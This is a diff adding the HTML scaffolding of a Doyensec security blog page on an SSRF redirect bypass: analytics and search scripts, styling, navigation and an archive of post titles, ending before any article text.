@@ -1,0 +1,3600 @@
+<html lang="en-us"><head>
+  <!-- Google Analytics -->
+  <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-JZXLTPSYW9&amp;l=dataLayer&amp;cx=c"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-164212227-2"></script>
+  <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-164212227-2');
+  </script>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" /><![endif]-->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" itemprop="description" content="SSRF Cross Protocol Redirect Bypass"> 
+  <meta name="keywords" content="doyensec, doyensecurity, security, infosec, vulnerability, exploit, offensive, pentest, pentester, hacking, auditing, reverse engineering, automation">
+  <meta name="robots" content="index, follow">
+  <meta name="robots" content="noodp">
+  <meta name="robots" content="noydir">
+
+  <title>
+    
+      SSRF Cross Protocol Redirect Bypass · Doyensec's Blog
+    
+  </title>
+
+  <!-- CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+
+  <link rel="stylesheet" href="/public/css/poole.css?v=20240126_2">
+  <link rel="stylesheet" href="/public/css/syntax.css?v=20240126_2">
+  <link rel="stylesheet" href="/public/css/hyde.css?v=20240315_1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="57x57" href="/public/images/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/public/images/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/public/images/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/public/images/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/public/images/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/public/images/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/images/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/public/images/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/public/images/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="/public/images/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/public/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/public/images/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/public/images/favicon-16x16.png">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+  <!-- Algolia Search -->
+    <!-- Including InstantSearch.js library and styling -->
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4.11.0/dist/algoliasearch-lite.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.css@8.1.0/themes/algolia.css">
+
+<script>
+
+// Implementing debouncing function
+let debounceTimeout = null;
+const debounce = (fn, delay) => {
+  return (...args) => {
+    clearTimeout(debounceTimeout);
+    debounceTimeout = setTimeout(() => {
+      fn(...args);
+    }, delay);
+  };
+};
+
+const searchClient = algoliasearch('DNTV54E87H', 'f5d9cbd9d7281957d7dc471838a68278');
+
+const search = instantsearch({
+  indexName: 'jekyll',
+  searchClient,
+  searchFunction(helper) {
+    const searchhits = document.querySelector('#search-hits');
+    const posts = document.querySelector('#posts-wrapper');
+    searchhits.style.display = helper.state.query === '' ? 'none' : '';
+    posts.style.display = helper.state.query === '' ? '' : 'none';
+    if (helper.state.query) {
+      helper.search();
+    }
+  }
+});
+
+const hitTemplate = function(hit) {
+  let date = '';
+  if (hit.date) {
+    date = moment.unix(hit.date).format('MMM D, YYYY');
+  }
+  var url;
+
+  if (`/${hit.url}`.startsWith("//")) {
+    hit.url = hit.url.slice(1);
+  }
+
+  if (hit.anchor)
+    url = `/${hit.url}#${hit.anchor}`;
+  else
+    url = `/${hit.url}`;
+
+  const title = hit._highlightResult.title.value;
+
+  let breadcrumbs = '';
+  if (hit._highlightResult.headings) {
+    breadcrumbs = hit._highlightResult.headings.map(match => {
+      return `<span class="post-breadcrumb">${match.value}</span>`
+    }).join(' > ')
+  }
+  const content = decodeHtmlEntities(hit._highlightResult.html.value);
+
+  return `
+    <div class="post-item">
+      <span class="post-meta">${date}</span>
+      <h2><a class="post-link" href="${url}">${title}</a></h2>
+      ${breadcrumbs ? `<div class="post-breadcrumbs">${breadcrumbs}</div>` : ''}
+      <div class="post-snippet">${content}</div>
+    </div>
+  `;
+};
+
+const emptyTemplate = `<div>
+  <p>No results have been found.<br>Try changing a bit your search query or 
+    <a role="button" href=".">reset your search</a>.
+  </p>
+</div>`;
+
+function isMobileView() {
+  return document.querySelector(".navbar").clientHeight != 0;
+}
+
+function isMobileSafari() {
+  return /iPad|iPhone|iPod/.test(navigator.platform) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /MacIntel/.test(navigator.platform));
+}
+
+document.addEventListener("DOMContentLoaded", (event) => {
+  
+  let needsiOSFix = isMobileSafari() && isMobileView()
+  
+  search.addWidgets(
+    [
+      instantsearch.widgets.searchBox({
+        container: '#search-searchbar',
+        escapeHTML: false,
+        searchAsYouType: !needsiOSFix,
+        placeholder: 'Search the blog',
+        showLoadingIndicator: true,
+        queryHook(query, refine) {
+          debounce(() => {
+            refine(query);
+          }, 500)(); // Delay in milliseconds; adjust as needed
+        }
+      }),
+      instantsearch.widgets.hits({
+      container: '#search-hits',
+      templates: {
+        item: hitTemplate,
+        empty: emptyTemplate
+      }
+    })
+  ]);
+  search.start();
+
+  /* Close the sidebar on search submit on mobile view */
+  closeMobileSidebarOnSearch();
+});
+
+function closeMobileSidebarOnSearch() {
+  const form = document.querySelector("#search-searchbar form")
+  const bsOffcanvas = new bootstrap.Offcanvas('#sidebar');
+  form.addEventListener("submit", () => {
+    bsOffcanvas.hide();
+    window.scrollTo(0, 0);
+  });
+}
+
+function decodeHtmlEntities(encodedString) {
+  const textArea = document.createElement('textarea');
+  textArea.innerHTML = encodedString;
+  return textArea.value;
+}
+
+</script>
+
+
+<style>
+.ais-InfiniteHits-list, .ais-InfiniteResults-list, .ais-Hits-list, .ais-Results-list {
+  display: inline;
+}
+.ais-InfiniteHits-item, .ais-InfiniteResults-item, .ais-Hits-item, .ais-Results-item {
+    border: none;
+    box-shadow: none;
+}
+#search-searchbar {
+  min-height: 61px;
+}
+.ais-SearchBox-form > input {
+    width: 100%;
+    height: 100%;
+    background: #e5dccb;
+    border-radius: 8px;
+    padding: 12px 12px 12px 26px;
+    font-weight: 400;
+    color: #655d4f;
+    font-size: smaller;
+}
+.ais-SearchBox-form {
+  max-width: 100%;
+  height: 100%;
+}
+.post-item {
+  margin-bottom: 30px;
+}
+.post-link .ais-Highlight {
+  color: #111;
+  font-style: normal;
+  text-decoration: underline;
+}
+.post-breadcrumbs {
+  color: #424242;
+  display: block;
+}
+.post-breadcrumb {
+  font-size: 18px;
+  color: #424242;
+}
+.post-breadcrumb .ais-Highlight {
+  font-weight: bold;
+  font-style: normal;
+}
+.post-snippet .ais-Highlight {
+  color: #2a7ae2;
+  font-style: normal;
+  font-weight: bold;
+}
+.post-snippet img {
+  display: none;
+}
+</style>
+</head>
+
+
+  <body class="theme-base-doyensec">
+
+    <div id="wrapper">
+  <video id="video-background" autoplay="" muted="" loop="" preload="" class="homepage__hero_animation" style="position: relative;height: 100%;" playsinline="">
+    <source src="https://doyensec.com/img/home-video.mp4" type="video/mp4">
+  </video>
+</div>
+<nav class="navbar fixed-top bg-dark" data-bs-theme="dark">
+  <div class="container-fluid">
+    <div class="navbar-brand "><a href="/index.html" class="align-middle"><img src="/public/images/doyensec-logo.svg"></a></div>
+
+    <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#sidebar" aria-controls="sidebar" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+  </div>
+</nav>
+<div class="offcanvas offcanvas-top sidebar" data-bs-keyboard="true" id="sidebar">
+  <button type="button" class="btn-close btn-close-white navbar-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+  <div class="navbar-brand-big"><a href="/index.html"><img src="/public/images/logo.svg" class="navbar-brand__image"></a></div>
+  
+  <div class="sidebar-sticky">
+    <div class="sidebar-about">
+      <h4>ABOUT <span>US</span></h4>
+      <p class="lead">We are <a href="https://doyensec.com" target="_blank"><b>security engineers</b></a> who break bits and tell stories.<br><br>Visit us<br><a href="https://doyensec.com" target="_blank">doyensec.com</a><br><br>Follow us<br><a href="https://twitter.com/doyensec" target="_blank">@doyensec</a><br><br>Engage us<br><a href="mailto:info@doyensec.com" target="_blank">info@doyensec.com</a><br><br></p>
+    </div>
+
+    <div class="sidebar-nav">
+      
+
+      
+      
+        
+          
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+    </div>
+    <h4 id="archive-header">Blog Archive</h4>
+    <ul class="posts-archive">
+        
+        
+        
+        
+          <li>
+            <a class="yearBtn" data-year="2024" href="#">2024</a>
+            <div class="postsMonths" id="posts-in-2024" style="display:none">
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1714600800" data-url="/2024/05/02/products-security-audit-vs-bugbounty.html" data-title="• Product Security Audits vs. Bug Bounty"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1711062000" data-url="/2024/03/22/summer-internship-2023.html" data-title="• Internship Experiences at Doyensec"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1710370800" data-url="/2024/03/14/supplychain.html" data-title="• A Look at Software Composition Analysis"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1708124400" data-url="/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html" data-title="• Unveiling the Prototype Pollution Gadgets Finder"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1706569200" data-url="/2024/01/30/poiex-release.html" data-title="• Introducing PoIEx - Points Of Intersection Explorer"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1705964400" data-url="/2024/01/23/k8s-scheduling-secure-design.html" data-title="• Kubernetes Scheduling And Secure Design"></span>
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+            <li data-month="May">  <a class="monthBtn" href="#">May</a>  <ul style="display:none"><li><a href="/2024/05/02/products-security-audit-vs-bugbounty.html" target="_blank">• Product Security Audits vs. Bug Bounty</a></li></ul>  </li><li data-month="March">  <a class="monthBtn" href="#">March</a>  <ul style="display:none"><li><a href="/2024/03/22/summer-internship-2023.html" target="_blank">• Internship Experiences at Doyensec</a></li><li><a href="/2024/03/14/supplychain.html" target="_blank">• A Look at Software Composition Analysis</a></li></ul>  </li><li data-month="February">  <a class="monthBtn" href="#">February</a>  <ul style="display:none"><li><a href="/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html" target="_blank">• Unveiling the Prototype Pollution Gadgets Finder</a></li></ul>  </li><li data-month="January">  <a class="monthBtn" href="#">January</a>  <ul style="display:none"><li><a href="/2024/01/30/poiex-release.html" target="_blank">• Introducing PoIEx - Points Of Intersection Explorer</a></li><li><a href="/2024/01/23/k8s-scheduling-secure-design.html" target="_blank">• Kubernetes Scheduling And Secure Design</a></li></ul>  </li></div>
+          </li>
+        
+          <li>
+            <a class="yearBtn" data-year="2023" href="#">2023</a>
+            <div class="postsMonths" id="posts-in-2023" style="display:none">
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1698966000" data-url="/2023/11/03/Office-Document-Poisoning.html" data-title="• Office Documents Poisoning in SHVE"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1695592800" data-url="/2023/09/25/clientside-javascript-instrumentation.html" data-title="• Client-side JavaScript Instrumentation"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1693432800" data-url="/2023/08/31/introducing-session-hijacking-visual-exploitation.html" data-title="• Introducing Session Hijacking Visual Exploitation (SHVE): An Innovative Open-Source Tool for XSS Exploitation"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1692223200" data-url="/2023/08/17/inql-v5.html" data-title="• InQL v5: A Technical Deep Dive"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1690322400" data-url="/2023/07/26/huawei-theme-arbitrary-code-exec.html" data-title="• Huawei Theme Manager Arbitrary Code Execution"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1689631200" data-url="/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html" data-title="• Streamlining Websocket Pentesting with wsrepl"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1686607200" data-url="/2023/06/13/messing-around-with-aws-batch-for-privilege-escalations.html" data-title="• Messing Around With AWS Batch For Privilege Escalations"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1686002400" data-url="/2023/06/06/logistics.html" data-title="• Logistics for a Remote Company"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1685570400" data-url="/2023/06/01/r2pickledec.html" data-title="• Reversing Pickles with r2pickledec"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1683151200" data-url="/2023/05/04/testing-ztp-platforms-a-primer.html" data-title="• Testing Zero Touch Production Platforms and Safe Proxies"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1679954400" data-url="/2023/03/28/wallet-info.html" data-title="• The Case For Improving Crypto Wallet Security"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1679353200" data-url="/2023/03/21/windows-installer.html" data-title="• Windows Installer EOP (CVE-2023-21800)"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1678921200" data-url="/2023/03/16/ssrf-remediation-bypass.html" data-title="• SSRF Cross Protocol Redirect Bypass"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1677538800" data-url="/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html" data-title="• A New Vector For “Dirty” Arbitrary File Write to RCE"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1676329200" data-url="/2023/02/14/pesd-extension-public-release.html" data-title="• Introducing Proxy Enriched Sequence Diagrams (PESD)"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1674514800" data-url="/2023/01/24/tampering-unrestricted-user-attributes-aws-cognito.html" data-title="• Tampering User Attributes In AWS Cognito User Pools"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1673305200" data-url="/2023/01/10/imagemagick-security-policy-evaluator.html" data-title="• ImageMagick Security Policy Evaluator"></span>
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+            <li data-month="November">  <a class="monthBtn" href="#">November</a>  <ul style="display:none"><li><a href="/2023/11/03/Office-Document-Poisoning.html" target="_blank">• Office Documents Poisoning in SHVE</a></li></ul>  </li><li data-month="September">  <a class="monthBtn" href="#">September</a>  <ul style="display:none"><li><a href="/2023/09/25/clientside-javascript-instrumentation.html" target="_blank">• Client-side JavaScript Instrumentation</a></li></ul>  </li><li data-month="August">  <a class="monthBtn" href="#">August</a>  <ul style="display:none"><li><a href="/2023/08/31/introducing-session-hijacking-visual-exploitation.html" target="_blank">• Introducing Session Hijacking Visual Exploitation (SHVE): An Innovative Open-Source Tool for XSS Exploitation</a></li><li><a href="/2023/08/17/inql-v5.html" target="_blank">• InQL v5: A Technical Deep Dive</a></li></ul>  </li><li data-month="July">  <a class="monthBtn" href="#">July</a>  <ul style="display:none"><li><a href="/2023/07/26/huawei-theme-arbitrary-code-exec.html" target="_blank">• Huawei Theme Manager Arbitrary Code Execution</a></li><li><a href="/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html" target="_blank">• Streamlining Websocket Pentesting with wsrepl</a></li></ul>  </li><li data-month="June">  <a class="monthBtn" href="#">June</a>  <ul style="display:none"><li><a href="/2023/06/13/messing-around-with-aws-batch-for-privilege-escalations.html" target="_blank">• Messing Around With AWS Batch For Privilege Escalations</a></li><li><a href="/2023/06/06/logistics.html" target="_blank">• Logistics for a Remote Company</a></li></ul>  </li><li data-month="May">  <a class="monthBtn" href="#">May</a>  <ul style="display:none"><li><a href="/2023/06/01/r2pickledec.html" target="_blank">• Reversing Pickles with r2pickledec</a></li><li><a href="/2023/05/04/testing-ztp-platforms-a-primer.html" target="_blank">• Testing Zero Touch Production Platforms and Safe Proxies</a></li></ul>  </li><li data-month="March">  <a class="monthBtn" href="#">March</a>  <ul style="display:none"><li><a href="/2023/03/28/wallet-info.html" target="_blank">• The Case For Improving Crypto Wallet Security</a></li><li><a href="/2023/03/21/windows-installer.html" target="_blank">• Windows Installer EOP (CVE-2023-21800)</a></li><li><a href="/2023/03/16/ssrf-remediation-bypass.html" target="_blank">• SSRF Cross Protocol Redirect Bypass</a></li></ul>  </li><li data-month="February">  <a class="monthBtn" href="#">February</a>  <ul style="display:none"><li><a href="/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html" target="_blank">• A New Vector For “Dirty” Arbitrary File Write to RCE</a></li><li><a href="/2023/02/14/pesd-extension-public-release.html" target="_blank">• Introducing Proxy Enriched Sequence Diagrams (PESD)</a></li></ul>  </li><li data-month="January">  <a class="monthBtn" href="#">January</a>  <ul style="display:none"><li><a href="/2023/01/24/tampering-unrestricted-user-attributes-aws-cognito.html" target="_blank">• Tampering User Attributes In AWS Cognito User Pools</a></li><li><a href="/2023/01/10/imagemagick-security-policy-evaluator.html" target="_blank">• ImageMagick Security Policy Evaluator</a></li></ul>  </li></div>
+          </li>
+        
+          <li>
+            <a class="yearBtn" data-year="2022" href="#">2022</a>
+            <div class="postsMonths" id="posts-in-2022" style="display:none">
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1670886000" data-url="/2022/12/13/safeurl.html" data-title="• safeurl for Go"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1668466800" data-url="/2022/11/15/learning-ajp.html" data-title="• Let's speak AJP"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1667948400" data-url="/2022/11/09/recruiting-security-researchers.html" data-title="• Recruiting Security Researchers Remotely"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1666821600" data-url="/2022/10/27/jupytervscode.html" data-title="• Visual Studio Code Jupyter Notebook RCE"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1666044000" data-url="/2022/10/18/cloudsectidbit-dataimport.html" data-title="• The Danger of Falling to System Role in AWS SDK Client"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1665439200" data-url="/2022/10/11/ebpf-bypass-security-monitoring.html" data-title="• On Bypassing eBPF Security Monitoring"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1665007200" data-url="/2022/10/06/semgrep-codeql.html" data-title="• Comparing Semgrep and CodeQL"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1664229600" data-url="/2022/09/27/electron-api-default-permissions.html" data-title="• Diving Into Electron Web API Permissions"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1662415200" data-url="/2022/09/06/electrong-launch.html" data-title="• ElectroNG, our premium SAST tool released!"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1661292000" data-url="/2022/08/24/intern-experience.html" data-title="• My Internship Experience at Doyensec"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1658354400" data-url="/2022/07/21/dependency-confusion.html" data-title="• Dependency Confusion"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1654725600" data-url="/2022/06/09/apache-pinot-sqli-rce.html" data-title="• Apache Pinot SQLi and RCE Cheat Sheet"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1650924000" data-url="/2022/04/26/vbox-fuzzing.html" data-title="• Introduction to VirtualBox security research"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1644966000" data-url="/2022/02/16/h1jack-the-game.html" data-title="• H1.Jack, The Game"></span>
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+            <li data-month="December">  <a class="monthBtn" href="#">December</a>  <ul style="display:none"><li><a href="/2022/12/13/safeurl.html" target="_blank">• safeurl for Go</a></li></ul>  </li><li data-month="November">  <a class="monthBtn" href="#">November</a>  <ul style="display:none"><li><a href="/2022/11/15/learning-ajp.html" target="_blank">• Let's speak AJP</a></li><li><a href="/2022/11/09/recruiting-security-researchers.html" target="_blank">• Recruiting Security Researchers Remotely</a></li></ul>  </li><li data-month="October">  <a class="monthBtn" href="#">October</a>  <ul style="display:none"><li><a href="/2022/10/27/jupytervscode.html" target="_blank">• Visual Studio Code Jupyter Notebook RCE</a></li><li><a href="/2022/10/18/cloudsectidbit-dataimport.html" target="_blank">• The Danger of Falling to System Role in AWS SDK Client</a></li><li><a href="/2022/10/11/ebpf-bypass-security-monitoring.html" target="_blank">• On Bypassing eBPF Security Monitoring</a></li><li><a href="/2022/10/06/semgrep-codeql.html" target="_blank">• Comparing Semgrep and CodeQL</a></li></ul>  </li><li data-month="September">  <a class="monthBtn" href="#">September</a>  <ul style="display:none"><li><a href="/2022/09/27/electron-api-default-permissions.html" target="_blank">• Diving Into Electron Web API Permissions</a></li><li><a href="/2022/09/06/electrong-launch.html" target="_blank">• ElectroNG, our premium SAST tool released!</a></li></ul>  </li><li data-month="August">  <a class="monthBtn" href="#">August</a>  <ul style="display:none"><li><a href="/2022/08/24/intern-experience.html" target="_blank">• My Internship Experience at Doyensec</a></li></ul>  </li><li data-month="July">  <a class="monthBtn" href="#">July</a>  <ul style="display:none"><li><a href="/2022/07/21/dependency-confusion.html" target="_blank">• Dependency Confusion</a></li></ul>  </li><li data-month="June">  <a class="monthBtn" href="#">June</a>  <ul style="display:none"><li><a href="/2022/06/09/apache-pinot-sqli-rce.html" target="_blank">• Apache Pinot SQLi and RCE Cheat Sheet</a></li></ul>  </li><li data-month="April">  <a class="monthBtn" href="#">April</a>  <ul style="display:none"><li><a href="/2022/04/26/vbox-fuzzing.html" target="_blank">• Introduction to VirtualBox security research</a></li></ul>  </li><li data-month="February">  <a class="monthBtn" href="#">February</a>  <ul style="display:none"><li><a href="/2022/02/16/h1jack-the-game.html" target="_blank">• H1.Jack, The Game</a></li></ul>  </li></div>
+          </li>
+        
+          <li>
+            <a class="yearBtn" data-year="2021" href="#">2021</a>
+            <div class="postsMonths" id="posts-in-2021" style="display:none">
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1621461600" data-url="/2021/05/20/graphql-csrf.html" data-title="• That single GraphQL issue that you keep missing"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1615417200" data-url="/2021/03/11/regexploit.html" data-title="• Regexploit: DoS-able Regular Expressions"></span>
+                
+              
+                
+                
+                
+                  <span class="post-entry" data-date="1613430000" data-url="/2021/02/16/electron-apis-misuse.html" data-title="• Electron APIs Misuse: An Attacker’s First Choice"></span>
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
+                
+              
+                
+                
